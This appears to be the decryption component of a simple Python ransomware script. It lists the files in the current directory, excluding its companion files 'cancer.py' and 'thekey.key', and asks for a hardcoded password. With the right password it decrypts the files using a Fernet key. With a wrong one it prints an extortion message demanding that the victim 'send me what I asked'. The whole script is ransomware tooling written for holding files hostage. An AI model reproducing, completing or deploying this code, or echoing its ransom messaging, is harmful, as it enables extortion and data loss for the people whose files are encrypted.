#!/usr/bin/env python3

#find files in the dir to encrypt

import os
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
	if file == "cancer.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretpass = "Yogui"
user_pass = input("Enter the secret password to decrypt your files\n")

if user_pass == secretpass:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("congrats!! your files have been decrypted ")
else:
	print("sorry, wrong password. keep trying and risk your files or send me what I asked")
